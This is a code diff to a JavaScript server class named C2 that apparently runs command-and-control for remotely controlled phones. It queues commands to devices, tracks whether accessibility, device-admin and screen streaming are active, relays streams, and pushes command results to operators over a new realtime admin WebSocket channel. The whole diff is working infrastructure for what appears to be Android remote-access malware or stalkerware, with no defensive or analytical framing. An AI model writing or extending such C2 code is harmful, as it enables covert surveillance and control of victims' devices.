@@ -59,6 +59,7 @@ export class C2 {
     this.admins = new Set();      // admin tokens
     this.rooms = new Map();       // "dev/kind" -> Set(viewer ws)
     this.devSockets = new Map();  // "dev/kind" -> device ws
+    this.adminSockets = new Set(); // open admin event channels (/ws/events)
     this.seq = 0;
     this.lastPersist = new Map(); // id -> ts
 
@@ -140,6 +141,15 @@ export class C2 {
       const body = await request.json();
       const id = body.id || "";
       if (!(await this.deviceAuth(request, id))) return json({ ok: false }, 401);
+      // The poll doubles as the liveness signal: refresh it here so the device
+      // does not need a separate heartbeat on every cycle.
+      const d = this.devices.get(id);
+      if (d) {
+        d.battery = body.battery || 0; d.network = body.network || "";
+        d.ip = clientIp(request); d.last_seen = Date.now() / 1000;
+        d.admin = body.admin ? 1 : 0; d.a11y = body.a11y ? 1 : 0; d.stream = body.stream ? 1 : 0;
+        await this.persDevice(id);
+      }
       const cmds = [];
       for (const c of this.commands.values()) {
         if (c.device_id === id && c.status === "queued") {
@@ -161,6 +171,24 @@ export class C2 {
         c.status = "done";
         c.result = JSON.stringify(body.result);
         c.done = Date.now() / 1000;
+        await this.storage.put("cmd:" + c.id, c);
+        // Push the finished result straight to open admin panels instead of
+        // making them wait for their next cmdlog poll.
+        this.broadcastAdmin({
+          kind: "cmd", device_id: id, cid: c.id, status: "done",
+          type: c.type, result: body.result,
+        });
+      }
+      return json({ ok: true });
+    }
+
+    if (p === "/api/ack" && method === "POST") {
+      const body = await request.json();
+      const id = body.id || "";
+      if (!(await this.deviceAuth(request, id))) return json({ ok: false }, 401);
+      const c = this.commands.get(Number(body.cid));
+      if (c && c.device_id === id && c.status !== "done") {
+        c.status = "executing";
         await this.storage.put("cmd:" + c.id, c);
       }
       return json({ ok: true });
@@ -224,6 +252,24 @@ export class C2 {
       };
       this.commands.set(id, cmd);
       await this.storage.put("cmd:" + id, cmd);
+      // Instant delivery: push down the device's command socket so the phone
+      // reacts immediately instead of at the next poll. If that push never
+      // actually carries the command, the timeout re-queues it for the HTTP
+      // poll fallback (a device ack within 8s cancels the re-queue).
+      if (this.pushToDevice(body.device_id, { cid: id, type: body.type, args: body.args || {} })) {
+        cmd.status = "sent";
+        await this.storage.put("cmd:" + id, cmd);
+        setTimeout(async () => {
+          const cur = this.commands.get(id);
+          if (cur && cur.status === "sent") {
+            cur.status = "queued";
+            await this.storage.put("cmd:" + id, cur);
+          }
+        }, 8000);
+      }
+      this.broadcastAdmin({
+        kind: "cmd", device_id: body.device_id, cid: id, status: cmd.status, type: body.type,
+      });
       return json({ ok: true, cid: id });
     }
 
@@ -287,12 +333,48 @@ export class C2 {
       return json({ ok: true });
     }
 
+    // -------- realtime admin event channel --------
+    if (seg[0] === "ws" && seg[1] === "events") {
+      return this.events(request);
+    }
+
     // -------- stream relay --------
     if (seg[0] === "ws" && seg[1] === "stream" && seg.length >= 4) {
       return this.stream(request, seg[2], seg[3]);
     }
 
     return json({ ok: false, err: "notfound" }, 404);
+  }
+
+  pushToDevice(deviceId, msg) {
+    const sock = this.devSockets.get(deviceId + "/cmd");
+    if (!sock) return false;
+    try {
+      sock.send(JSON.stringify(msg));
+      return true;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  broadcastAdmin(msg) {
+    if (!this.adminSockets.size) return;
+    const s = JSON.stringify(msg);
+    for (const w of [...this.adminSockets]) {
+      try { w.send(s); } catch (e) { this.adminSockets.delete(w); }
+    }
+  }
+
+  events(request) {
+    if (!this.adminToken(request)) return new Response("unauthorized", { status: 401 });
+    const pair = new WebSocketPair();
+    const [client, server] = Object.values(pair);
+    server.accept();
+    this.adminSockets.add(server);
+    const close = () => { this.adminSockets.delete(server); };
+    server.addEventListener("close", close);
+    server.addEventListener("error", close);
+    return new Response(null, { status: 101, webSocket: client });
   }
 
   stream(request, deviceId, kind) {
